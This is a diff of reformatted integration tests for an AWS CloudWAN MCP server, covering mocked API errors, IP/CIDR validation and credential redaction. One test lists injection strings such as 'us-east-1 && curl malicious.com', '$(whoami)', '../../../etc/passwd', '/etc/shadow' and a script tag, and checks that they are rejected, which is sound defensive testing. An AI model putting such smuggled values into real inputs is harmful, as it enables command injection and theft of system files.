+                        "Message": "Core network core-network-nonexistent does not exist",
+                        "ResourceType": "CoreNetwork",
+                        "ResourceId": "core-network-nonexistent",
                     }
                 },
-                'GetCoreNetworkPolicy'
+                "GetCoreNetworkPolicy",
             )
             mock_get_client.return_value = mock_client
 
-            result = await get_core_network_policy('core-network-nonexistent')
+            result = await get_core_network_policy("core-network-nonexistent")
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert parsed['error_code'] == 'ResourceNotFoundException'
-            assert 'core-network-nonexistent does not exist' in parsed['error']
+            assert parsed["success"] is False
+            assert parsed["error_code"] == "ResourceNotFoundException"
+            assert "core-network-nonexistent does not exist" in parsed["error"]
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_global_network_not_found_with_dependencies(self):
         """Test global network not found affecting dependent resources."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.describe_global_networks.side_effect = ClientError(
                 {
-                    'Error': {
-                        'Code': 'ResourceNotFoundException',
-                        'Message': 'Global network global-network-123 was not found',
-                        'ResourceArn': 'arn:aws:networkmanager::123456789012:global-network/global-network-123'
+                    "Error": {
+                        "Code": "ResourceNotFoundException",
+                        "Message": "Global network global-network-123 was not found",
+                        "ResourceArn": "arn:aws:networkmanager::123456789012:global-network/global-network-123",
                     }
                 },
-                'DescribeGlobalNetworks'
+                "DescribeGlobalNetworks",
             )
             mock_get_client.return_value = mock_client
 
             result = await get_global_networks()
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert parsed['error_code'] == 'ResourceNotFoundException'
-            assert 'global-network-123 was not found' in parsed['error']
+            assert parsed["success"] is False
+            assert parsed["error_code"] == "ResourceNotFoundException"
+            assert "global-network-123 was not found" in parsed["error"]
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_transit_gateway_attachment_not_found(self):
         """Test transit gateway attachment not found with detailed error context."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.describe_transit_gateway_peering_attachments.side_effect = ClientError(
                 {
-                    'Error': {
-                        'Code': 'InvalidTransitGatewayAttachmentID.NotFound',
-                        'Message': 'The transitGatewayAttachment ID tgw-attach-invalid does not exist',
-                        'InvalidParameter': 'TransitGatewayAttachmentId'
+                    "Error": {
+                        "Code": "InvalidTransitGatewayAttachmentID.NotFound",
+                        "Message": "The transitGatewayAttachment ID tgw-attach-invalid does not exist",
+                        "InvalidParameter": "TransitGatewayAttachmentId",
                     }
                 },
-                'DescribeTransitGatewayPeeringAttachments'
+                "DescribeTransitGatewayPeeringAttachments",
             )
             mock_get_client.return_value = mock_client
 
-            result = await analyze_tgw_peers('tgw-attach-invalid')
+            result = await analyze_tgw_peers("tgw-attach-invalid")
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert parsed['error_code'] == 'InvalidTransitGatewayAttachmentID.NotFound'
-            assert 'tgw-attach-invalid does not exist' in parsed['error']
+            assert parsed["success"] is False
+            assert parsed["error_code"] == "InvalidTransitGatewayAttachmentID.NotFound"
+            assert "tgw-attach-invalid does not exist" in parsed["error"]
 
 
 class TestInvalidParameterValueScenarios:
@@ -216,66 +209,66 @@
     async def test_invalid_cidr_format_variations(self):
         """Test various invalid CIDR format scenarios."""
         invalid_cidrs = [
-            '256.256.256.256/24',  # Invalid IP octets
-            '192.168.1.0/33',      # Invalid subnet mask
-            '10.0.0.0/-1',         # Negative subnet mask
-            '172.16.0.0/ab',       # Non-numeric subnet mask
-            'not-an-ip/16',        # Non-IP format
-            '192.168.1.1/24/extra' # Extra components
+            "256.256.256.256/24",  # Invalid IP octets
+            "192.168.1.0/33",  # Invalid subnet mask
+            "10.0.0.0/-1",  # Negative subnet mask
+            "172.16.0.0/ab",  # Non-numeric subnet mask
+            "not-an-ip/16",  # Non-IP format
+            "192.168.1.1/24/extra",  # Extra components
         ]
 
         for invalid_cidr in invalid_cidrs:
-            result = await validate_ip_cidr('validate_cidr', cidr=invalid_cidr)
+            result = await validate_ip_cidr("validate_cidr", cidr=invalid_cidr)
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert 'validate_ip_cidr failed:' in parsed['error']
+            assert parsed["success"] is False
+            assert "validate_ip_cidr failed:" in parsed["error"]
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_invalid_region_parameter(self):
         """Test invalid region parameter handling."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.list_core_networks.side_effect = ClientError(
                 {
-                    'Error': {
-                        'Code': 'InvalidParameterValue',
-                        'Message': 'Invalid region: invalid-region-1234',
-                        'ParameterName': 'Region',
-                        'ParameterValue': 'invalid-region-1234'
+                    "Error": {
+                        "Code": "InvalidParameterValue",
+                        "Message": "Invalid region: invalid-region-1234",
+                        "ParameterName": "Region",
+                        "ParameterValue": "invalid-region-1234",
                     }
                 },
-                'ListCoreNetworks'
+                "ListCoreNetworks",
             )
             mock_get_client.return_value = mock_client
 
-            result = await list_core_networks(region='invalid-region-1234')
+            result = await list_core_networks(region="invalid-region-1234")
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert parsed['error_code'] == 'InvalidParameterValue'
-            assert 'invalid-region-1234' in parsed['error']
+            assert parsed["success"] is False
+            assert parsed["error_code"] == "InvalidParameterValue"
+            assert "invalid-region-1234" in parsed["error"]
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_invalid_ip_address_formats(self):
         """Test various invalid IP address format scenarios."""
         invalid_ips = [
-            '999.999.999.999',     # Out of range octets
-            '192.168.1',           # Incomplete IP
-            '192.168.1.1.1',       # Too many octets
-            'not.an.ip.address',   # Non-numeric octets
-            '192.168.01.001',      # Leading zeros
-            '192.168.1.-1'         # Negative octet
+            "999.999.999.999",  # Out of range octets
+            "192.168.1",  # Incomplete IP
+            "192.168.1.1.1",  # Too many octets
+            "not.an.ip.address",  # Non-numeric octets
+            "192.168.01.001",  # Leading zeros
+            "192.168.1.-1",  # Negative octet
         ]
 
         for invalid_ip in invalid_ips:
-            result = await validate_ip_cidr('validate_ip', ip=invalid_ip)
+            result = await validate_ip_cidr("validate_ip", ip=invalid_ip)
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert 'validate_ip_cidr failed:' in parsed['error']
+            assert parsed["success"] is False
+            assert "validate_ip_cidr failed:" in parsed["error"]
 
 
 class TestDependencyViolationScenarios:
@@ -285,53 +278,53 @@
     @pytest.mark.asyncio
     async def test_core_network_policy_dependency_violation(self):
         """Test core network policy update with dependency violations."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.get_core_network_policy.side_effect = ClientError(
                 {
-                    'Error': {
-                        'Code': 'DependencyViolation',
-                        'Message': 'Cannot modify policy while change set is pending execution',
-                        'DependentResource': 'CoreNetworkChangeSet',
-                        'DependentResourceId': 'change-set-12345'
+                    "Error": {
+                        "Code": "DependencyViolation",
+                        "Message": "Cannot modify policy while change set is pending execution",
+                        "DependentResource": "CoreNetworkChangeSet",
+                        "DependentResourceId": "change-set-12345",
                     }
                 },
-                'GetCoreNetworkPolicy'
+                "GetCoreNetworkPolicy",
             )
             mock_get_client.return_value = mock_client
 
-            result = await get_core_network_policy('core-network-123')
+            result = await get_core_network_policy("core-network-123")
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert parsed['error_code'] == 'DependencyViolation'
-            assert 'change set is pending execution' in parsed['error']
+            assert parsed["success"] is False
+            assert parsed["error_code"] == "DependencyViolation"
+            assert "change set is pending execution" in parsed["error"]
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_attachment_deletion_dependency_violation(self):
         """Test attachment deletion blocked by route table dependencies."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.search_transit_gateway_routes.side_effect = ClientError(
                 {
-                    'Error': {
-                        'Code': 'DependencyViolation',
-                        'Message': 'Cannot analyze routes while attachment deletion is in progress',
-                        'ConflictingOperation': 'DeleteTransitGatewayVpcAttachment',
-                        'ConflictingResourceId': 'tgw-attach-dependency-123'
+                    "Error": {
+                        "Code": "DependencyViolation",
+                        "Message": "Cannot analyze routes while attachment deletion is in progress",
+                        "ConflictingOperation": "DeleteTransitGatewayVpcAttachment",
+                        "ConflictingResourceId": "tgw-attach-dependency-123",
                     }
                 },
-                'SearchTransitGatewayRoutes'
+                "SearchTransitGatewayRoutes",
             )
             mock_get_client.return_value = mock_client
 
-            result = await analyze_tgw_routes('tgw-rtb-123')
+            result = await analyze_tgw_routes("tgw-rtb-123")
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert parsed['error_code'] == 'DependencyViolation'
-            assert 'attachment deletion is in progress' in parsed['error']
+            assert parsed["success"] is False
+            assert parsed["error_code"] == "DependencyViolation"
+            assert "attachment deletion is in progress" in parsed["error"]
 
 
 class TestInvalidPolicyDocumentScenarios:
@@ -342,58 +335,56 @@
     async def test_malformed_policy_json_structure(self):
         """Test malformed policy document JSON structure validation."""
         malformed_policies = [
-            {'version': '2021.12'},  # Missing core-network-configuration
+            {"version": "2021.12"},  # Missing core-network-configuration
             {
-                'version': '2021.12',
-                'core-network-configuration': {
-                    'asn-ranges': []  # Empty ASN ranges
-                }
+                "version": "2021.12",
+                "core-network-configuration": {
+                    "asn-ranges": []  # Empty ASN ranges
+                },
             },
             {
-                'version': 'invalid-version',  # Invalid version
-                'core-network-configuration': {
-                    'asn-ranges': ['64512-64555']
-                }
-            }
+                "version": "invalid-version",  # Invalid version
+                "core-network-configuration": {"asn-ranges": ["64512-64555"]},
+            },
         ]
 
         for policy in malformed_policies:
             result = await validate_cloudwan_policy(policy)
 
             parsed = json.loads(result)
-            assert parsed['success'] is True  # Function succeeds but validation fails
-            assert parsed['overall_status'] == 'invalid'
+            assert parsed["success"] is True  # Function succeeds but validation fails
+            assert parsed["overall_status"] == "invalid"
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_policy_syntax_errors(self):
         """Test policy document syntax error detection."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.get_core_network_policy.side_effect = ClientError(
                 {
-                    'Error': {
-                        'Code': 'InvalidPolicyDocumentException',
-                        'Message': 'Policy document contains syntax errors at line 15',
-                        'PolicyErrors': [
+                    "Error": {
+                        "Code": "InvalidPolicyDocumentException",
+                        "Message": "Policy document contains syntax errors at line 15",
+                        "PolicyErrors": [
                             {
-                                'ErrorCode': 'InvalidSegmentName',
-                                'ErrorMessage': 'Segment name contains invalid characters',
-                                'LineNumber': 15
+                                "ErrorCode": "InvalidSegmentName",
+                                "ErrorMessage": "Segment name contains invalid characters",
+                                "LineNumber": 15,
                             }
-                        ]
+                        ],
                     }
                 },
-                'GetCoreNetworkPolicy'
+                "GetCoreNetworkPolicy",
             )
             mock_get_client.return_value = mock_client
 
-            result = await get_core_network_policy('core-network-123')
+            result = await get_core_network_policy("core-network-123")
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert parsed['error_code'] == 'InvalidPolicyDocumentException'
-            assert 'syntax errors at line 15' in parsed['error']
+            assert parsed["success"] is False
+            assert parsed["error_code"] == "InvalidPolicyDocumentException"
+            assert "syntax errors at line 15" in parsed["error"]
 
 
 class TestConcurrentModificationScenarios:
@@ -403,53 +394,53 @@
     @pytest.mark.asyncio
     async def test_concurrent_policy_modification(self):
         """Test concurrent policy modification detection."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.get_core_network_policy.side_effect = ClientError(
                 {
-                    'Error': {
-                        'Code': 'ConcurrentModificationException',
-                        'Message': 'Policy is being modified by another operation',
-                        'ConflictingOperationId': 'op-12345',
-                        'ConflictingOperationType': 'UpdateCoreNetworkPolicy'
+                    "Error": {
+                        "Code": "ConcurrentModificationException",
+                        "Message": "Policy is being modified by another operation",
+                        "ConflictingOperationId": "op-12345",
+                        "ConflictingOperationType": "UpdateCoreNetworkPolicy",
                     }
                 },
-                'GetCoreNetworkPolicy'
+                "GetCoreNetworkPolicy",
             )
             mock_get_client.return_value = mock_client
 
-            result = await get_core_network_policy('core-network-123')
+            result = await get_core_network_policy("core-network-123")
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert parsed['error_code'] == 'ConcurrentModificationException'
-            assert 'modified by another operation' in parsed['error']
+            assert parsed["success"] is False
+            assert parsed["error_code"] == "ConcurrentModificationException"
+            assert "modified by another operation" in parsed["error"]
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_concurrent_route_table_modification(self):
         """Test concurrent route table modification scenarios."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.search_transit_gateway_routes.side_effect = ClientError(
                 {
-                    'Error': {
-                        'Code': 'ConcurrentModificationException',
-                        'Message': 'Route table is being modified concurrently',
-                        'LastModifiedTime': '2024-01-15T10:30:45Z',
-                        'ModifyingUser': 'arn:aws:iam::123456789012:user/network-admin'
+                    "Error": {
+                        "Code": "ConcurrentModificationException",
+                        "Message": "Route table is being modified concurrently",
+                        "LastModifiedTime": "2024-01-15T10:30:45Z",
+                        "ModifyingUser": "arn:aws:iam::123456789012:user/network-admin",
                     }
                 },
-                'SearchTransitGatewayRoutes'
+                "SearchTransitGatewayRoutes",
             )
             mock_get_client.return_value = mock_client
 
-            result = await analyze_tgw_routes('tgw-rtb-123')
+            result = await analyze_tgw_routes("tgw-rtb-123")
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert parsed['error_code'] == 'ConcurrentModificationException'
-            assert 'being modified concurrently' in parsed['error']
+            assert parsed["success"] is False
+            assert parsed["error_code"] == "ConcurrentModificationException"
+            assert "being modified concurrently" in parsed["error"]
 
 
 class TestCrossServiceErrorPropagation:
@@ -466,34 +457,34 @@
             call_count += 1
             mock_client = Mock()
 
-            if service == 'networkmanager' and call_count == 1:
+            if service == "networkmanager" and call_count == 1:
                 # First call succeeds
-                mock_client.list_core_networks.return_value = {'CoreNetworks': []}
-            elif service == 'ec2' and call_count == 2:
+                mock_client.list_core_networks.return_value = {"CoreNetworks": []}
+            elif service == "ec2" and call_count == 2:
                 # Second call fails, propagating error
                 mock_client.describe_vpcs.side_effect = ClientError(
                     {
-                        'Error': {
-                            'Code': 'ServiceUnavailableException',
-                            'Message': 'EC2 service temporarily unavailable due to NetworkManager dependency failure'
+                        "Error": {
+                            "Code": "ServiceUnavailableException",
+                            "Message": "EC2 service temporarily unavailable due to NetworkManager dependency failure",
                         }
                     },
-                    'DescribeVpcs'
+                    "DescribeVpcs",
                 )
 
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=progressive_failure):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=progressive_failure):
             # First call should succeed
             nm_result = await list_core_networks()
             nm_parsed = json.loads(nm_result)
-            assert nm_parsed['success'] is True
+            assert nm_parsed["success"] is True
 
             # Second call should fail with propagated error
             vpc_result = await discover_vpcs()
             vpc_parsed = json.loads(vpc_result)
-            assert vpc_parsed['success'] is False
-            assert vpc_parsed['error_code'] == 'ServiceUnavailableException'
+            assert vpc_parsed["success"] is False
+            assert vpc_parsed["error_code"] == "ServiceUnavailableException"
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -501,32 +492,32 @@
         """Test authentication error propagation across multiple service calls."""
         auth_error = ClientError(
             {
-                'Error': {
-                    'Code': 'UnauthorizedOperation',
-                    'Message': 'You are not authorized to perform this operation. Contact account administrator',
-                    'AuthorizationFailureType': 'InsufficientPermissions'
+                "Error": {
+                    "Code": "UnauthorizedOperation",
+                    "Message": "You are not authorized to perform this operation. Contact account administrator",
+                    "AuthorizationFailureType": "InsufficientPermissions",
                 }
             },
-            'UnauthorizedOperation'
+            "UnauthorizedOperation",
         )
 
         def auth_failure_factory(service, region=None):
             mock_client = Mock()
-            if service == 'networkmanager':
+            if service == "networkmanager":
                 mock_client.list_core_networks.side_effect = auth_error
                 mock_client.describe_global_networks.side_effect = auth_error
-            elif service == 'ec2':
+            elif service == "ec2":
                 mock_client.describe_vpcs.side_effect = auth_error
                 mock_client.search_transit_gateway_routes.side_effect = auth_error
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=auth_failure_factory):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=auth_failure_factory):
             # Test multiple operations fail with same auth error
             operations = [
                 list_core_networks(),
                 get_global_networks(),
                 discover_vpcs(),
-                analyze_tgw_routes('tgw-rtb-123')
+                analyze_tgw_routes("tgw-rtb-123"),
             ]
 
             results = await asyncio.gather(*operations, return_exceptions=True)
@@ -534,9 +525,9 @@
             for result in results:
                 assert not isinstance(result, Exception)
                 parsed = json.loads(result)
-                assert parsed['success'] is False
-                assert parsed['error_code'] == 'UnauthorizedOperation'
-                assert 'not authorized to perform this operation' in parsed['error']
+                assert parsed["success"] is False
+                assert parsed["error_code"] == "UnauthorizedOperation"
+                assert "not authorized to perform this operation" in parsed["error"]
 
 
 class TestErrorRecoveryPatterns:
@@ -557,23 +548,23 @@
                 # First two calls fail
                 mock_client.list_core_networks.side_effect = ClientError(
                     {
-                        'Error': {
-                            'Code': 'ServiceUnavailableException',
-                            'Message': 'Service temporarily unavailable',
-                            'RetryAfterSeconds': '1'
+                        "Error": {
+                            "Code": "ServiceUnavailableException",
+                            "Message": "Service temporarily unavailable",
+                            "RetryAfterSeconds": "1",
                         }
                     },
-                    'ListCoreNetworks'
+                    "ListCoreNetworks",
                 )
             else:
                 # Third call succeeds
                 mock_client.list_core_networks.return_value = {
-                    'CoreNetworks': [{'CoreNetworkId': 'core-network-recovery-test'}]
+                    "CoreNetworks": [{"CoreNetworkId": "core-network-recovery-test"}]
                 }
 
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=temporary_failure_mock):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=temporary_failure_mock):
             # First two attempts should fail
             result1 = await list_core_networks()
             result2 = await list_core_networks()
@@ -583,10 +574,10 @@
             parsed2 = json.loads(result2)
             parsed3 = json.loads(result3)
 
-            assert parsed1['success'] is False
-            assert parsed2['success'] is False
-            assert parsed3['success'] is True
-            assert parsed3['core_networks'][0]['CoreNetworkId'] == 'core-network-recovery-test'
+            assert parsed1["success"] is False
+            assert parsed2["success"] is False
+            assert parsed3["success"] is True
+            assert parsed3["core_networks"][0]["CoreNetworkId"] == "core-network-recovery-test"
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -603,41 +594,38 @@
                 # First 5 calls fail rapidly
                 mock_client.get_core_network_policy.side_effect = ClientError(
                     {
-                        'Error': {
-                            'Code': 'InternalFailure',
-                            'Message': f'Internal service error #{failure_count}',
-                            'CircuitBreakerState': 'OPEN' if failure_count >= 3 else 'CLOSED'
+                        "Error": {
+                            "Code": "InternalFailure",
+                            "Message": f"Internal service error #{failure_count}",
+                            "CircuitBreakerState": "OPEN" if failure_count >= 3 else "CLOSED",
                         }
                     },
-                    'GetCoreNetworkPolicy'
+                    "GetCoreNetworkPolicy",
                 )
             else:
                 # After circuit breaker threshold, service recovers
                 mock_client.get_core_network_policy.return_value = {
-                    'CoreNetworkPolicy': {
-                        'PolicyVersionId': '1',
-                        'PolicyDocument': '{"version": "2021.12"}'
-                    }
+                    "CoreNetworkPolicy": {"PolicyVersionId": "1", "PolicyDocument": '{"version": "2021.12"}'}
                 }
 
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=circuit_breaker_mock):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=circuit_breaker_mock):
             results = []
 
             # Simulate multiple rapid-fire requests
             for i in range(7):
-                result = await get_core_network_policy('core-network-123')
+                result = await get_core_network_policy("core-network-123")
                 results.append(json.loads(result))
 
             # First 5 should fail
             for i in range(5):
-                assert results[i]['success'] is False
-                assert results[i]['error_code'] == 'InternalFailure'
+                assert results[i]["success"] is False
+                assert results[i]["error_code"] == "InternalFailure"
 
             # Later calls should succeed after circuit breaker recovery
-            assert results[6]['success'] is True
-            assert results[6]['policy_version_id'] == '1'
+            assert results[6]["success"] is True
+            assert results[6]["policy_version_id"] == "1"
 
 
 class TestErrorResponseFormatValidation:
@@ -649,38 +637,38 @@
         """Test AWS error response structure compliance across all error types."""
         error_scenarios = [
             {
-                'error_code': 'AccessDenied',
-                'error_message': 'Access denied for resource',
-                'operation': 'ListCoreNetworks'
+                "error_code": "AccessDenied",
+                "error_message": "Access denied for resource",
+                "operation": "ListCoreNetworks",
             },
             {
-                'error_code': 'ValidationException',
-                'error_message': 'Validation failed for parameter',
-                'operation': 'GetCoreNetworkPolicy'
+                "error_code": "ValidationException",
+                "error_message": "Validation failed for parameter",
+                "operation": "GetCoreNetworkPolicy",
             },
             {
-                'error_code': 'InternalFailure',
-                'error_message': 'Internal server error occurred',
-                'operation': 'DescribeVpcs'
-            }
+                "error_code": "InternalFailure",
+                "error_message": "Internal server error occurred",
+                "operation": "DescribeVpcs",
+            },
         ]
 
         for scenario in error_scenarios:
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                 mock_client = Mock()
                 error = ClientError(
                     {
-                        'Error': {
-                            'Code': scenario['error_code'],
-                            'Message': scenario['error_message'],
-                            'Type': 'Client' if scenario['error_code'] != 'InternalFailure' else 'Server'
+                        "Error": {
+                            "Code": scenario["error_code"],
+                            "Message": scenario["error_message"],
+                            "Type": "Client" if scenario["error_code"] != "InternalFailure" else "Server",
+                        },
+                        "ResponseMetadata": {
+                            "RequestId": f"req-{scenario['error_code']}-123",
+                            "HTTPStatusCode": 403 if scenario["error_code"] == "AccessDenied" else 400,
                         },
-                        'ResponseMetadata': {
-                            'RequestId': f"req-{scenario['error_code']}-123",
-                            'HTTPStatusCode': 403 if scenario['error_code'] == 'AccessDenied' else 400
-                        }
                     },
-                    scenario['operation']
+                    scenario["operation"],
                 )
 
                 mock_client.list_core_networks.side_effect = error
@@ -689,12 +677,12 @@
                 result = await list_core_networks()
 
                 parsed = json.loads(result)
-                assert parsed['success'] is False
-                assert parsed['error_code'] == scenario['error_code']
-                assert scenario['error_message'] in parsed['error']
+                assert parsed["success"] is False
+                assert parsed["error_code"] == scenario["error_code"]
+                assert scenario["error_message"] in parsed["error"]
 
                 # Validate AWS Labs error response structure
-                required_fields = ['success', 'error', 'error_code']
+                required_fields = ["success", "error", "error_code"]
                 for field in required_fields:
                     assert field in parsed, f"Missing required field: {field}"
 
@@ -704,40 +692,33 @@
         """Test error message localization and internationalization handling."""
         localized_errors = [
             {
-                'error_code': 'AccessDenied',
-                'error_message': 'Accès refusé pour cette ressource',  # French
-                'locale': 'fr-FR'
+                "error_code": "AccessDenied",
+                "error_message": "Accès refusé pour cette ressource",  # French
+                "locale": "fr-FR",
             },
             {
-                'error_code': 'ValidationException',
-                'error_message': 'パラメータの検証に失敗しました',  # Japanese
-                'locale': 'ja-JP'
-            }
+                "error_code": "ValidationException",
+                "error_message": "パラメータの検証に失敗しました",  # Japanese
+                "locale": "ja-JP",
+            },
         ]
 
         for error_scenario in localized_errors:
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                 mock_client = Mock()
                 mock_client.list_core_networks.side_effect = ClientError(
                     {
-                        'Error': {
-                            'Code': error_scenario['error_code'],
-                            'Message': error_scenario['error_message']
-                        },
-                        'ResponseMetadata': {
-                            'HTTPHeaders': {
-                                'content-language': error_scenario['locale']
-                            }
-                        }
+                        "Error": {"Code": error_scenario["error_code"], "Message": error_scenario["error_message"]},
+                        "ResponseMetadata": {"HTTPHeaders": {"content-language": error_scenario["locale"]}},
                     },
-                    'ListCoreNetworks'
+                    "ListCoreNetworks",
                 )
                 mock_get_client.return_value = mock_client
 
                 result = await list_core_networks()
 
                 parsed = json.loads(result)
-                assert parsed['success'] is False
-                assert parsed['error_code'] == error_scenario['error_code']
+                assert parsed["success"] is False
+                assert parsed["error_code"] == error_scenario["error_code"]
                 # Should handle non-ASCII characters properly
-                assert error_scenario['error_message'] in parsed['error']
+                assert error_scenario["error_message"] in parsed["error"]

--- cloudwan-mcp-server/tests/integration/test_final_compliance_validation.py
+++ cloudwan-mcp-server/tests/integration/test_final_compliance_validation.py
@@ -43,7 +43,7 @@
 
         assert dockerfile_path.exists(), "Dockerfile must exist"
 
-        with open(dockerfile_path, 'r') as f:
+        with open(dockerfile_path, "r") as f:
             dockerfile_content = f.read()
 
         # Critical security requirements from Agent F1
@@ -51,18 +51,14 @@
             # SHA-verified base images
             "@sha256:",
             "FROM public.ecr.aws/docker/library/python:",
-
             # Non-root user execution
             "adduser -S app",
             "USER app",
-
             # Health check implementation
             "HEALTHCHECK",
             "docker-healthcheck.sh",
-
             # Multi-stage build
             "AS uv",
-
             # Security labels and metadata
             "WORKDIR /app",
             "--chown=app:app",
@@ -77,7 +73,7 @@
 
         assert healthcheck_path.exists(), "Health check script must exist"
 
-        with open(healthcheck_path, 'r') as f:
+        with open(healthcheck_path, "r") as f:
             script_content = f.read()
 
         # Security requirements
@@ -99,7 +95,7 @@
 
         assert requirements_path.exists(), "UV requirements file must exist"
 
-        with open(requirements_path, 'r') as f:
+        with open(requirements_path, "r") as f:
             requirements_content = f.read()
 
         # Verify hash-based security
@@ -127,28 +123,28 @@
             {
                 "input": "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE error occurred",
                 "should_not_contain": ["AKIAIOSFODNN7EXAMPLE"],
-                "should_contain": ["AWS_[VARIABLE_REDACTED]", "[ACCESS_KEY_REDACTED]"]
+                "should_contain": ["AWS_[VARIABLE_REDACTED]", "[ACCESS_KEY_REDACTED]"],
             },
             {
                 "input": "Profile production-admin failed authentication",
                 "should_not_contain": ["production-admin"],
-                "should_contain": ["[PROFILE_REDACTED]"]
+                "should_contain": ["[PROFILE_REDACTED]"],
             },
             {
                 "input": "Account 123456789012 access denied",
                 "should_not_contain": ["123456789012"],
-                "should_contain": ["[ACCOUNT_REDACTED]"]
+                "should_contain": ["[ACCOUNT_REDACTED]"],
             },
             {
                 "input": "arn:aws:iam::123456789012:role/AdminRole unauthorized",
                 "should_not_contain": ["123456789012", "AdminRole"],
-                "should_contain": ["[ARN_REDACTED]"]
+                "should_contain": ["[ARN_REDACTED]"],
             },
             {
                 "input": "Session token AQoEXAMPLEH4aoAH0gNCAPyJxz4BlCFFxWNE invalid",
                 "should_not_contain": ["AQoEXAMPLEH4aoAH0gNCAPyJxz4BlCFFxWNE"],
-                "should_contain": ["[SESSION_TOKEN_REDACTED]", "[CREDENTIAL_REDACTED]"]
-            }
+                "should_contain": ["[SESSION_TOKEN_REDACTED]", "[CREDENTIAL_REDACTED]"],
+            },
         ]
 
         for test_case in sensitive_test_cases:
@@ -156,13 +152,11 @@
 
             # Verify sensitive data is removed
             for sensitive in test_case["should_not_contain"]:
-                assert sensitive not in sanitized, \
-                    f"Sensitive data '{sensitive}' was not sanitized in: {sanitized}"
+                assert sensitive not in sanitized, f"Sensitive data '{sensitive}' was not sanitized in: {sanitized}"
 
             # Verify proper redaction markers
             has_redaction = any(marker in sanitized for marker in test_case["should_contain"])
-            assert has_redaction, \
-                f"Missing redaction markers {test_case['should_contain']} in: {sanitized}"
+            assert has_redaction, f"Missing redaction markers {test_case['should_contain']} in: {sanitized}"
 
     def test_secure_environment_update_validation(self):
         """Test secure environment update blocks malicious input."""
@@ -172,11 +166,9 @@
             ("AWS_DEFAULT_REGION", "us-east-1 && curl malicious.com"),
             ("AWS_PROFILE", "../../../etc/passwd"),
             ("AWS_DEFAULT_REGION", "$(whoami)"),
-
             # Path traversal attempts
             ("AWS_PROFILE", "../../admin"),
             ("AWS_DEFAULT_REGION", "/etc/shadow"),
-
             # Script injection
             ("AWS_PROFILE", "<script>alert('xss')</script>"),
             ("AWS_DEFAULT_REGION", "`id`"),
@@ -187,8 +179,7 @@
 
         for key, malicious_value in malicious_test_cases:
             result = secure_environment_update(key, malicious_value)
-            assert result is False, \
-                f"Malicious input '{malicious_value}' was not blocked for {key}"
+            assert result is False, f"Malicious input '{malicious_value}' was not blocked for {key}"
 
             # Verify environment wasn't corrupted
             assert os.environ.get("AWS_PROFILE") == original_profile
@@ -204,19 +195,15 @@
                 "identity": {
                     "account": "123456789012",
                     "user_id": "AIDACKCEVSQ6C2EXAMPLE",
-                    "arn": "arn:aws:iam::123456789012:user/admin-user"
+                    "arn": "arn:aws:iam::123456789012:user/admin-user",
                 },
                 "credentials": "super-secret-key-data",
                 "access_key": "AKIAIOSFODNN7EXAMPLE",
                 "secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
